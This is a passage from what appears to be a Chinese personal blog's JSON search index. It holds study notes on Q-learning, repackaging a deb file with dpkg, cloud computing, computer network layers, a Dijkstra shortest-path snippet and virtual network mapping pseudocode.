1234567R+r*max_Q(32)基本规则如下：Q表内容为index--state（agent的位置），columns--action(行为集)Q表（记录行为值）的计算规则是每次对于行为集合中的每一个action，对其进行计算、并进行选择。每一次episode，Q表更新一次定义EPSILON的目的是控制贪婪程度，其中，它可以随着时间推移 逐渐增加，贪婪) 主循环：图示 首先要对其评估和更新准则进行确定，代码中表示可以直接定义在一个结构中。 12345678910111213def update_env(S, episode, step_counter): # This is how environment be updated env_list = ['-']*(N_STATES-1) + ['T'] # '---------T' our environment if S == 'terminal': interaction = 'Episode %s: total_steps = %s' % (episode+1, step_counter) print('\\r&#123;&#125;'.format(interaction), end='') time.sleep(2) print('\\r ', end='') else: env_list[S] = 'o' interaction = ''.join(env_list) print('\\r&#123;&#125;'.format(interaction), end='') time.sleep(FRESH_TIME) demo,参考莫烦python的一个例子预先设置的参数，就是上述的预设值，其中gamma参数是作为奖励递减值，作用见后文代码，它是 123456N_STATES = #1维宽度ACTIONS = #动作集合EPSILON = #greedy贪婪值ALPHA = # learning rate 学习率GAMMA = # discount factor 奖励递减值MAX_EPISODES = # maximum episodes 最大回合数 Q表的行和列存储action和state，它的Value 每一次更新就是更新它的行为准则 123456def build_q_table(n_states, actions): table = pd.DataFrame( np.zeros((n_states, len(actions))), columns=actions, ) return table","categories":[{"name":"Reinforcement Learing","slug":"Reinforcement-Learing","permalink":"http://waynamigo.github.io/categories/Reinforcement-Learing/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"DQN","slug":"DQN","permalink":"http://waynamigo.github.io/tags/DQN/"}]},{"title":"解决软件源更新，旧版本软件应用无法使用的问题","slug":"2019-01-17-网易云音乐修改deb依赖","date":"2019-01-16T16:00:00.000Z","updated":"2022-07-16T04:45:09.893Z","comments":true,"path":"2019/01/17/2019-01-17-网易云音乐修改deb依赖/","link":"","permalink":"http://waynamigo.github.io/2019/01/17/2019-01-17-网易云音乐修改deb依赖/","excerpt":"简单的修改官方deb依赖的操作例子，以修改网易云音乐debian包为例","text":"简单的修改官方deb依赖的操作例子，以修改网易云音乐debian包为例 查看软件包里的文件内容(不必要，只是避免好久不用忘了参数1dpkg -c neteasemusic.deb 用dpkg解压1将软件包中的文件释放到extracted目录下 1dpkg-deb -x neteasemusic.deb extracted/ 解压deb包中DEBIAN目录下的文件1将主控信息解压，control中包括了所有依赖 dpkg创建包的时候，依赖的控制信息在DEBIAN文件夹中，所以首先要创建一个DEBIAN文件夹（大写 否则会出现错误 1dpkg-deb: error: failed to open package info file 'build//DEBIAN/control' for reading: No such file or directory 1dpkg-deb -e neteasemusic.deb extracted/DEBIAN 创建debian软件包1dpkg-deb -b extract/ ./ 参数如下123456789* -c：显示软件包中的文件列表；* -e：将主控信息解压；* -f：把字段内容打印到标准输出；* -x：将软件包中的文件释放到指定目录下；* -X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程；* -w：显示软件包的信息；* -l：显示软件包的详细信息；* -R：提取控制信息和存档的清单文件；* -b：创建debian软件包。","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"debian","slug":"debian","permalink":"http://waynamigo.github.io/tags/debian/"},{"name":"dpkg","slug":"dpkg","permalink":"http://waynamigo.github.io/tags/dpkg/"}]},{"title":"云计算复习","slug":"2019-01-08-云计算","date":"2019-01-07T16:00:00.000Z","updated":"2022-07-16T04:45:09.930Z","comments":true,"path":"2019/01/08/2019-01-08-云计算/","link":"","permalink":"http://waynamigo.github.io/2019/01/08/2019-01-08-云计算/","excerpt":"云计算概论","text":"云计算概论 绪论12* 云计算的定义* 云计算的人群 云计算的特征1234567超大规模高可扩展性虚拟化高可靠性通用性廉价性灵活定制 云计算的优点 虚拟化技术 动态可扩展 按需部署 高灵活性 高可靠性 高性价比 优点 缺点 降低用户计算机的成本 要求持续的网络连接 改善性能 低带宽网络连接环境下不能很好地工作 降低IT基础设施投资 反应慢 减少维护问题 减少软件开支 即时的软件更新 计算能力的增长 功能有限制 无限的存储能力 增强的数据安全性 无法确保数据的安全性 改善操作系统的兼容性 改善文档格式的兼容性 不能保证数据不会丢失 简化团队协作 没有地点限制的数据获取 绿色计算思想的实现者 分类服务类型： 基础设施、平台、应用部署范围： 公有、私有、混合 并行计算、分布式计算、网格计算属于计算科学 云计算、效用计算属于计算模式、商业模式与网格计算的区别： 网格是共享资源、协同计算，是一种资源共享模型。 而云计算采用网络将集群资源连接在一起，单向提供给用户资源进行数据处理。 资源调度模式 ：云计算以数据为中心，采用集群存储管理资源；网格计算以计算为中心，资源分布在各地。云计算进一步将硬件虚拟化。云计算体系结构IaaS、PaaS、SaaS infrastructure asa service： 硬件 资源 platform asa service： 软件环境 software asa service：应用程序 云存储结构 GFS (Google File System) HDFS(Hadoop Distributed File System) 存储层 基础管理层 应用接口层 访问层云计算技术体系结构 物理资源层：计算机、存储器、网络设施、数据库、软件 资源池层：将大量相同类型的资源构成资源池 管理中间件层： 资源管理、任务管理、用户管理、安全管理 SOA(Service-Oriented Architecture）构建层：将云计算能力封装成标准的Web Services 云计算的两条底层技术路线 分布式计算：把一个任务分解成多个小人物，在不同的服务器进行计算，整合计算资源 虚拟化：提供Iaas虚机，分割计算资源 VMM的分类 VMM(virtual machine monitor)虚拟化核心软件管理虚拟环境、管理物理资源 所谓虚拟化，是指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机 123虚拟化就是由位于下层的软件模块,通过向上一层软件模块提供一个与它原先所期待的运行环境 完全一致 的接口的方法,抽象出一个虚拟的软件或硬件接口,使得上层软件可以直接运行在虚拟环境上。 虚拟化的优点:封装(逻辑化)\\多实例–计算资源的充分利用率、绿色节能、降低成本\\隔离\\硬件兼容\\虚拟化层特权 虚拟化的缺点:性能错误安全影响复杂：虚拟化层的引入增加了系统出错层面(如有些驱动无法加载) 虚拟平台：完全虚拟化 半虚拟化 实现结构 ：Hypervisor模型宿主模型混合模型 IO虚拟化 发现虚拟设备 虚机加载驱动，通过vmm提供的后端接口驱动设备 后端驱动程序调用物理驱动程序管理物理IO设备 设备模型指VMM中进行设备模拟,并处理所有设备请求和响应的逻辑模块 ssh原理 客户端向服务器端发出连接请求 服务器端向客户端发出自己的公钥 客户端使用服务器端的公钥加密通讯密钥然后发给服务器端 如果通讯过程被截获,由于窃听者即使获知公钥和经过公钥加密的内容,但不拥有私钥依然无法解密(RSA算法) 服务器端接收到密文后,用私钥解密,获知通讯密钥 ssh-keygen命令给服务器端产生公私钥密钥对 Hadoop HDFS NameNode DataNode 事务日志 映像文件 SecondaryNameNode 读取数据流程 12345客户端要访问HDFS中的一个文件首先从namenode获得组成这个文件的数据块位置列表根据列表知道存储数据块的datanode访问datanode获取数据Namenode并不参与数据实际传输 冗余副本策略,所有数据块都有副本 心跳机制，保证数据一致性 机架策略 Hbase HBase是一个分布式的、面向列的开源数据库 适合于非结构化数据存储的数据库 行键是数据行在表里的唯一标识 123* 以表的形式存放数据* 表由行与列组成,每个列属于某个列族,由行和列确定的存储单元称为元素* 每个元素保存了同一份数据的多个版本,由时间戳来标识区分 列表示为&lt;列族&gt;:&lt;限定符&gt; Hbase在磁盘上按照列族存储数据,这种列式数据库的设计非常适合于数据分析 列族里的元素最好具有相同的读写方式(例如等长的字符串),以提高性能，可压缩 docker 把Linux的cgroup、namespace,chroot等容器底层技术进行封装抽象,为用户提供了创建和管理容器的便捷界面","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"Cloud Computing","slug":"Cloud-Computing","permalink":"http://waynamigo.github.io/tags/Cloud-Computing/"}]},{"title":"网络原理应用层复习","slug":"2019-01-07-应用层","date":"2019-01-06T16:00:00.000Z","updated":"2022-07-16T04:45:09.964Z","comments":true,"path":"2019/01/07/2019-01-07-应用层/","link":"","permalink":"http://waynamigo.github.io/2019/01/07/2019-01-07-应用层/","excerpt":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测","text":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测 域名系统 DNS 文件传送协议 远程终端协议 TELNET 万维网 WWW 电子邮件 动态主机配置协议 DHCP P2P 应用 #总结 国家顶级域名 nTLD 通用顶级域名 gTLD 基础结构域名 (infrastructure domain)，顶级域名只有一个,即 arpa 一个服务器所负责管辖的(或有权限的)范围叫区 (zone)。 每一个区设置相应的权限域名服务器,用来保存该区中的所有主机的域名到 IP 地址的映射。根域名服务器共有 13 套装置,不是 13 个机器 可靠性：DNS 域名服务器都把数据复制到几个域名服务器来保存,其中的一个是主域名服务器,其他的是辅助域名服务器域名服务器 根域名服务器 最高层次的域名服务器,也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址a.rootservers.netb.rootservers.net 顶级域名服务器 权限域名服务器 本地域名服务器域名的解析过程 主机向本地域名服务器的查询一般都是采用递归查询 本地域名服务器向根域名服务器的查询通常是采用迭代查询。高速缓存 每个域名服务器都维护一个高速缓存* ,存放最近用过的名字以及从何处获得名字映射信息的记录 文件传输 文件传送协议 FTP (File Transfer Protocol) 提供交互式的访问工作步骤 打开熟知端口(端口号为 21),使客户进程能够连接上。 等待客户进程发出连接请求。 启动从属进程来处理客户进程发来的请求。 回到等待状态,继续接受其他客户进程发来的请求。控制连接和数据连接控制连接在整个会话期间一直保持打开，实际用于传输文件的是“数据连接”超媒体超文本","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理运输层复习","slug":"2019-01-06-传输层","date":"2019-01-05T16:00:00.000Z","updated":"2022-07-16T04:45:09.670Z","comments":true,"path":"2019/01/06/2019-01-06-传输层/","link":"","permalink":"http://waynamigo.github.io/2019/01/06/2019-01-06-传输层/","excerpt":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测","text":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测 用户数据报协议 UDP 传输控制协议 TCP 可靠传输的工作原理 TCP 报文段的首部格式 TCP 的流量控制、拥塞控制 TCP 的运输连接管理 TCP UDP 传输的数据单位：运输协议数据单元 TPDU (Transport Protocol Data Unit) 用户数据报协议UDP (User Datagram Protocol) 无连接 ├── 在传送数据之前不需要先建立连接 ├── 对方的运输层在收到 UDP 报文后,不需要给出任何确认。 └── 不提供可靠交付与IP数据报的区别：IP需要经过存储转发过程、UDP在运输层的端到端（进程）的逻辑信道中传送，只比IP数据报服务多了 复用分用 差错检测特点 UDP 是无连接的,发送数据之前不需要建立连接,因此减少了开销和发送数据之前的时延 UDP 使用尽最大努力交付,即不保证可靠交付 UDP 是面向报文的,UDP 一次交付一个完整的报文。 UDP 没有拥塞控制 UDP 支持一对一、一对多、多对一和多对多的交互通信,全双工 UDP 的首部开销小,只有 8 个字节,比TCP 的 20 个字节的首部要短。 传输控制协议 TCP (Transmission Control Protocol) 面向连接的运输层协议 TCP 连接只能有两个端点 提供可靠交付 提供全双工通信 面向字节流特点根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节(UDP 发送的报文长度是应用进程给出的) 可靠传输 停止等待协议 连续ARQ协议 123456789发送方维持的发送窗口,它的意义是:位于发送窗口内的分组都可连续发送出去,而不需要等待对方的确认。这样,信道利用率就提高了。连续 ARQ 协议规定,发送方每收到一个确认,就把发送窗口向前滑动一个分组的位置。接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认,而是对按序到达的最后一个分组发送确认,这样就表示:到这个分组为止的所有分组都已正确收到了。 确认丢失不必重传 不能向发送方反映出接收方已经正确收到的所有分组的信息 GBN重传 可以在连续收到好几个正确的确认帧后，才对最后一个数据帧发确认信息 这就是说，对某一数据帧的确认就表明该数据帧和这以前所有的数据帧均已正确无误地收到了。 后退N帧协议的接受窗口为1，可以保证按序接受数据帧。若采用n个比特对帧编号，则其发送窗口的尺寸Wt应满足：1&lt;=Wt&lt;=2^n-1 ACK(n+1)表示对第n号帧的确认，表明接受方已正确收到第n帧及以前的所有帧 例题：数据链路层采用了后退N帧(GBN)协议，发送方已经发送了编号为0～7的帧。当计时器超时时，若发送方只收到0、2、3号帧的确认，则发送方需要重发的帧数是( )。 1解析：根据后退N帧协议，接收方的窗口为“1”，如果发送方收到了3号帧的确认，则说明0、1、2、3号帧都已经发送成功，所以只需要重发4、5、6、7号帧即可。 TCP可靠重传 字节为单位的滑动窗口 1234567891011121314151617181920发送缓存：存放①发送应用程序传送给发送方 TCP 准备发送的数据 ②TCP 已发送出但尚未收到确认的数据* 超时重传时间* 选择确认SACK## TCP流量控制出现拥塞的原因:∑对资源需求 &gt; 可用资源* 增加资源不能解决拥塞，重传也不行，反而可能加剧* 拥塞控制：为了防止过多数据注入到网络中，一个全局性的过程* 流量控制：点对通信量的控制，一个端到端的过程，抑制发送端发送数据的速率,以便使接收端来得及接收开环控制、闭环控制。### tcp拥塞控制方法（闭环控制TCP发送方维持一个拥塞窗口 CWND(Congestion Window)*判断方式 有两个：** 使用**重传定时器**定时，若超时，重传；* 收到三个重复的ACK算法有四种，慢开始，&lt;blue&gt;拥塞避免&lt;/blue&gt;、快重传、快恢复* 拥塞窗口 cwnd 设置：最大报文段 SMSS 窗口数值* 慢开始门限 ssthresh(状态变量):防止拥塞窗口cwnd 增长过大引起网络拥塞。 当 cwnd &lt; ssthresh 时,使用慢开始算法。当 cwnd &gt; ssthresh 时,停止使用慢开始算法而改用拥塞避免算法。当 cwnd = ssthresh 时,既可使用慢开始算法,也可使用拥塞避免算法。 * 3ACK 拥塞避免，变成一半，然后拥塞避免，线性增加 * 超时 cwnd=1，慢开始，从1开始增加 ### 快重传：让发送方尽早知道发生了个别报文段的丢失 发送方只要一连收到三个重复确认,就知道接 收方确实没有收到报文段,因而应当立即进行 重传(即“快重传”),这样就不会出现超时, 发送方也不就会误认为出现了网络拥塞 {% image /img/FN.png '' '' %} ## TCP三次握手 发送链接请求报文段 * A ---------------------------------------- B * A发请求报文段，同步位SYN=1，选择序号seq=x表示第一个数据字节的序号为x * B发确认报文段，同步位SYN=1，确认位ACK=1，确认号ack=x+1，自己的数据序号seq=y * A发确认报文段，确认位ACK=1，数据序号seq=x+1，确认号ack=y+1 发送链接释放报文段 * A ---------------------------------------- B * A发请求报文段，FIN=1，选择序号seq=u * B发确认报文段，ACK=1，确认号ack=u+1，数据序号seq=v，A半关闭 * B发确认报文段，FIN=1，ACK=1，确认号ack=u+1，数据序号seq=w * A发确认报文段，ACK=1，确认号ack=w+1，数据序号seq=u+1，A关闭 **其中，A 必须等待 2MSL 的时间** * 保证 A 发送的最后一个 ACK 报文段能够到达 B。 * A 在发送完最后一个 ACK 报文段后,再经过时间 2MSL,就可以使本连接持续的 时间内所产生的所有报文段,都从网络中消失。这样就可以使下一个新的连接中不会出现这种 旧的连接请求报文段。","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理网络层复习","slug":"2019-01-05-网络层复习","date":"2019-01-04T16:00:00.000Z","updated":"2022-07-16T04:45:11.216Z","comments":true,"path":"2019/01/05/2019-01-05-网络层复习/","link":"","permalink":"http://waynamigo.github.io/2019/01/05/2019-01-05-网络层复习/","excerpt":"限于IP层","text":"限于IP层 网络层向运输层提供的服务 面向连接 无连接IP协议123* 地址解析协议 ARP(Address Resolution Protocol)** * 网际控制报文协议 ICMP(Internet Control Message Protocol)*** 网际组管理协议 IGMP(Internet Group Management Protocol)** 互联时使用中间设备 物理层中继系统:转发器 (repeater)。 数据链路层中继系统:网桥 或 桥接器 (bridge)。 网络层中继系统:路由器 (router)。 网桥和路由器的混合物:桥路器 (brouter)。 网络层以上的中继系统:网关 (gateway)。IP地址分类 A B C三类*123456网络号|主机号 一共32位IPv6 128位IP 地址 ::= &#123; &lt;网络号&gt;, &lt;主机号&gt;&#125;A类地址 8 ，24 [最大可指派网络126 (2^7 -1 -1)]B类地址 16，16 [最大可指派网络(2^14 -1 -1)]C类地址 24, 8 [最大可指派网络(2^21 -1 -1)] IP地址与硬件地址报文、数据帧的区别 其他分类方式 子网划分 构成超网 ARP协议,解决同一个局域网的主机或路由器的IP：MAC问题 不管网络层使用的是什么协议,在实际网络的链路上传送数据帧时,最终还是必须使用硬件地址。 ARP 高速缓存 (ARPcache),里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。格式 &lt; IP address;MAC address;TTL &gt; TTL (Time To Live):地址映射有效时间 。 12345存放最近获得的 IP 地址到 MAC 地址的绑定,以减少 ARP 广播的数量。为了减少网络上的通信量,主机 A 在发送其ARP请求分组时,就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。当主机 B 收到 A 的 ARP 请求分组时,就将主机 A的这一地址映射写入主机 B 自己的 ARP高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。 ARP请求分组包含发送方硬件地址 / 发送方IP 地址/目标方硬件地址(未知时填 0)/ 目标方IP 地址。 本地广播 ARP 请求 ARP 响应分组 包含发送方硬件地址/发送方IP地址/目标方硬件地址/目标方 IP 地址。 IP数据报分片数据报字段格式 转发过程：根据IP数据报的目的地址就可以确定下一跳路由器分组转发算法12345678910(1) 从数据报的首部提取目的主机的 IP 地址 D, 得出目的网络地址为 N。(2) 若网络 N 与此路由器直接相连,则把数据报直接交付目的主机D;否则是间接交付,执行(3)。(3) 若路由表中有目的地址为 D 的特定主机路由,则把数据报传送给路由表中所指明的下一跳路由器;否则,执行(4)。(4) 若路由表中有到达网络 N 的路由,则把数据报传送给路由表指明的下一跳路由器;否则,执行(5)。(5) 若路由表中有一个默认路由,则把数据报传送给路由表中所指明的默认路由器;否则,执行(6)。(6) 报告转发分组出错。 划分子网从 主机号借用几位 划分子网号 IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}与上述转发过程不同点：121)路由器在收到 IP 数据报后,再按目的网络号 net-id 和子网号 subnet-id 找到目的子网2)通过子网掩码与IP地址进行&amp;操作，匹配，则说明子网掩码代表的这个子网就是目的网络。 CIDR 无分类编址 CIDR，IP地址 ::= {&lt;网络前缀&gt;, &lt;主机号&gt;},中间使用符号‘/’来表示网络前缀构成超网路由聚合 有利于减少路由器之间选择的次数，从而提高性能。 CIDR记法 0 可以省略 最长前缀匹配原因：使用 CIDR 时,路由表中的每个项目由“网络前缀”和“下一跳地址”组成。在查找路由表时可能会得到不止一个匹配结果方案：在匹配结果中选择最长网络前缀的路由。 ICMP 报文格式 ICMP首部检验和 路由选择协议 内部网关协议 RIP ———| 内部网关协议 OSPF ———|–IGP 外部网关协议 BGP 将路由选择协议传递到另一个自制系统中使用4种报文打开 更新 保活 keepalive 通知 notification RIP(1)仅和相邻路由器交换信息。(2)交换的信息是当前本路由器所知道的全部信息,即自己的路由表。(3)按固定的时间间隔交换路由信息,例如,每隔30秒。当网络拓扑发生变化时,路由器也及时向相邻路由器通告拓扑变化后的路由信息。 隧道技术 在 IPv6 数据报要进入IPv4网络时,把 IPv6 数据报封装成为 IPv4 数据报,整个的 IPv6 数据报变成了 IPv4 数据报的数据部分。 当 IPv4 数据报离开 IPv4 网络中的隧道时,再把数据部分(即原来的 IPv6 数据报)交给主机的 IPv6 协议栈。 NAT技术 网络地址转换(Network Address Translation)解决：在专用网上使用专用地址的主机如何与互联网上的主机通信(并不需要加密)的问题 123456789内部主机 A 用本地地址 IP A 和互联网上主机 B 通信所发送的数据报必须经过 NAT 路由器。NAT 路由器将数据报的源地址 IP A 转换成全球地址IP G ,并把转换结果记录到NAT地址转换表中,目的地址 IP B 保持不变,然后发送到互联网。NAT 路由器收到主机 B 发回的数据报时,知道数据报中的源地址是 IP B 而目的地址是 IP G 。根据 NAT 转换表,NAT 路由器将目的地址 IP G 转换为IP A ,转发给最终的内部主机 A。","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理物理层链路层复习","slug":"2019-01-05-物理层链路层","date":"2019-01-04T16:00:00.000Z","updated":"2022-07-16T04:45:11.499Z","comments":true,"path":"2019/01/05/2019-01-05-物理层链路层/","link":"","permalink":"http://waynamigo.github.io/2019/01/05/2019-01-05-物理层链路层/","excerpt":"限于物理层、链路层","text":"限于物理层、链路层 物理层屏蔽双绞线 STP (Shielded Twisted Pair)无屏蔽双绞线 UTP (Unshielded Twisted Pair)1室内传送数据的无屏蔽双绞线和屏蔽双绞线的标准 EIA/TIA-568。 多模光纤12可以存在多条不同角度入射的光线在一条光纤中传输。这种光纤就称为多模光纤。 单模光纤12若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射,这样的光纤称为单模光纤 优点123456(1) 通信容量非常大。(2) 传输损耗小，中继距离长。(2) 抗雷电和电磁干扰性能好。(3) 无串音干扰，保密性好。(4) 体积小，重量轻。TIPS:光纤应用于：**企业网络 FTTH 和访问网络 长途网络 水下网络** 自由空间称为“非导引型传输媒体”。短波通信（即高频通信）主要是靠【电离层】的反射，但短波信道的通信质量较差，传输速率低微波在空间主要是直线传播 传统微波：地面微波接力通信 、卫星通信 宽带接入技术：有线宽带接入 无线宽带接入 非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术12345678910用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务特点：上行和下行带宽做成不对称的(上行指从用户到 ISP，而下行指从 ISP 到用户)。ADSL 在用户线（铜线）的两端各安装一个ADSL 调制解调器。我国目前采用的方案是离散多音调 DMT (Discrete Multi-Tone)调制技术。（这里的“多音调”就是【“多载波”或“多子信道”】的意思。DMT 调制技术采用【频分复用】的方法ADSL 采用【自适应调制技术】使用户线能够传送尽可能高的数据率，但【不能保证固定的数据率】第二代ADSL【无缝速率自适应技术 SRA (Seamless Rate Adaptation)】HFC网使用【模拟光纤技术】【电缆调制解调器】是为【 HFC 网】而使用的调制解调器 数据链路层链路层使用的信道 :点对点信道、广播信道链路&lt;通路 1234数据（逻辑）链路 (data link) 除了【物理线路】外，还必须有【通信协议】来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。一般的适配器都包括了【数据链路层和物理层】这两层的功能。 数据链路层协议要解决的基本问题【封装成帧】【透明传输】【差错控制】 ①封装成帧，在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。作用：确定帧的界限【帧定界】。—帧定界符SOH_DATA_EOT（end of transmission） ②透明传输：如果数据中的某个字节的二进制代码恰好和SOH或EOT一样数据链路层就会错误地“找到帧的边界” 123456解决方法：【字节填充 (byte stuffing)】或【字符填充(character stuffing)】。 1发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是 1B)。2接收端的数据链路层在将数据送往网络层之前删除插入的转义字符3如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。当接收端收到连续的两个转义字符时，就删除其中前面的一个 ③差错检测：在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1在一段时间内，传输错误的比特占所传输比特总数的比率称为【误码率 BER (Bit Error Rate)】。 循环冗余检验CRC计算冗余码，余数作为FCS【帧检验序列】 CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。 FCS 可以用 CRC 这种方法得出，但 CRC 并不是获得 FCS 的唯一方法 “无比特差错”与“无传输差错”是不同的概念。 (1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受 (accept)。 (2) 若余数 R！=0，则判定这个帧有差错，就丢弃。数据链路层的CRC检验可以实现【无比特差错】， 但是【不可靠传输】【不能确定是哪个比特出了差错】，只能做到【无差错接受】（无比特差错）要做到“可靠传输”（即发送什么就收到什么）就必须再加上【确认和重传机制】 PROTOCAL PPP(Point-to-Point Protocol)协议】点对点协议（包含了物理层和ip层的内容） 【面向字节，以字节为单位】 【一个将 IP 数据报封装到串行链路的方法】 【链路控制协议 LCP (Link Control Protocol)】 【网络控制协议 NCP (Network Control Protocol)】 【同步传输时，采用硬件完成【比特填充】，零比特传输：五个连续的1就填入一个0，接收时删除】 【异步传输时，使用特殊的字符填充法】MAC帧格式 PROTOCAL CSMA/CD局域网具有如下主要优点： 【具有广播功能】，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。 【便于系统的扩展和逐渐地演变】，各设备的位置可灵活调整和改变。 【提高了系统的可靠性、可用性、残存性】","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"Dijstra","slug":"2018-12-11-dijstra","date":"2018-12-10T16:00:00.000Z","updated":"2022-07-16T04:45:11.310Z","comments":true,"path":"2018/12/11/2018-12-11-dijstra/","link":"","permalink":"http://waynamigo.github.io/2018/12/11/2018-12-11-dijstra/","excerpt":"求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了已经忘了","text":"求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了已经忘了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546struct Link&#123; int from,to,dist;&#125;;struct Node&#123; int d,u; bool operator &lt;(const HeapNode &amp; a) const&#123; return d &gt; a.d; &#125;&#125;;struct SubstrateNetwork&#123; int nodes; int links vector&lt;Link&gt; maplinks; bool isvisited[nodes+1]; vector&lt;int&gt; G[nodes+1]; int distance[nodes+1]; int p[nodes+1]; void init(int n)&#123; this-&gt;n = n; for(int i = 0;i &lt;= n;i++) G[i].clear(); memset(vis,false,sizeof vis); for(int i = 0;i &lt;= n;i++) p[i] = i; for(int i = 1;i &lt;= n;i++) d[i] = INF; &#125; void dijstra(int s)&#123; priority_queue&lt;Node&gt; q; q.push(Node&#123;0,s&#125;); distance[s] = 0; while(!q.empty())&#123; Node temp = q.top(); q.pop(); int u = temp.u; if(isvisited[u]) continue; isvisited[u]=true; for(int i=0;i&lt;G[u].size();i++)&#123; Link e = maplinks[G[u][i]]; if(distance[e.to] &gt; distance[u] + e.dist)&#123; distance[e.to] = distance[u] + e.dist; p[e.to] = u; q.push(HeapNode&#123;distance[e.to],e.to&#125;); &#125; &#125; &#125; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://waynamigo.github.io/tags/algorithm/"}]},{"title":"一些网页链接","slug":"2018-12-08-网页链接","date":"2018-12-07T16:00:00.000Z","updated":"2022-07-16T04:45:09.542Z","comments":true,"path":"2018/12/08/2018-12-08-网页链接/","link":"","permalink":"http://waynamigo.github.io/2018/12/08/2018-12-08-网页链接/","excerpt":"网络原理相关期刊","text":"网络原理相关期刊 顶级期刊名称：ieee network主页网址：ieee network 名称：journal of network and computer applications主页网址：journal of network and computer applications 名称：ieee-acm transactions on networking主页网址：ieee-acm transactions on networking 名称：Ad Hoc Networks主页网址：Ad Hoc Networks 名称：cluster computing-the journal of networks software tools and applications主页网址：cluster computing-the journal of networks software tools and applications 名称：Computer Networks主页网址：Computer Networks 名称：Optical Switching and Networking主页网址：Optical Switching and Networking 名称：Mobile Networks and Applications主页网址：Mobile Networks and Applications 名称：Wireless Networks主页网址：Wireless Networks 名称：Networks主页网址：Networks 名称：Journal of Network and Systems Management主页网址：Journal of Network and Systems Management 顶级会议：名称：acm sigcomm主页网址：acm sigcomm 名称: ieee infocom主页网址：ieee infocom","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"url","slug":"url","permalink":"http://waynamigo.github.io/tags/url/"}]},{"title":"映射过程描述","slug":"2018-12-01-映射过程描述","date":"2018-11-30T16:00:00.000Z","updated":"2022-07-16T04:45:11.449Z","comments":true,"path":"2018/12/01/2018-12-01-映射过程描述/","link":"","permalink":"http://waynamigo.github.io/2018/12/01/2018-12-01-映射过程描述/","excerpt":"虚拟网络映射算法的节点、链路映射一般过程","text":"虚拟网络映射算法的节点、链路映射一般过程 映射过程123456789for(request:requestList)&#123; 映射成功标记 flag ① flag = 节点映射结果 if(falg) 节点资源分配 执行②部分 else 本组request映射失败 ② flag = 链路映射结果 if(falg) 链路资源分配 else 本组request映射失败&#125; 节点映射过程12345678910111213排序物理网络、网络请求的节点;//每一次按改进的H值（加入负载均衡系数后）对物理网络进行排序for( vn_node : vn_nodes)&#123;//对每一个排序后的虚拟节点 for(遍历物理节点)&#123; if(物理节点节点剩余CPU &gt; 虚拟节点CPU需求)&#123; 存储映射结果，跳出for循环，映射下一个节点 &#125; if(物理节点遍历结束)&#123; 映射失败,返回false &#125; &#125;&#125;节点映射成功，分配物理节点资源 链路映射过程123456789101112for(vn_link :vn_links)&#123;//对每一个request的链路请求 取出链路需求带宽，起、止节点id 根据起止节点id(from,to)查找最短路径 floyd if(finded)&#123; //找到链路后验证带宽 if(链路需求带宽 &gt; 物理链路剩余带宽) 映射失败; else 